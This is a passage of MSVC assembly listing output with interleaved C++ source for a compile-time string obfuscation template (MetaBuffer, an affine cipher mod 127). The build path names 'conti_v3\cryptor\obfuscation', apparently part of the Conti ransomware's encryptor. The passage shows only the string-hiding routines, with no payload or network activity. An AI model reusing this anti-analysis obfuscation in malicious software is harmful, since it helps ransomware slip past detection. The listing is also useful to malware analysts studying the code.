  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  008bd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  008c1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv462[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  008c7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  008ce	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  008d5	5f		 pop	 rdi
  008d6	5d		 pop	 rbp
  008d7	c3		 ret	 0
??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<5,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 7a	 sub	 eax, 122		; 0000007aH
  0002d	6b c0 0c	 imul	 eax, eax, 12
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 35	 imul	 eax, eax, 53		; 00000035H
  0002d	83 c0 7a	 add	 eax, 122		; 0000007aH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 1a	 cmp	 QWORD PTR i$1[rbp], 26
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv280 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
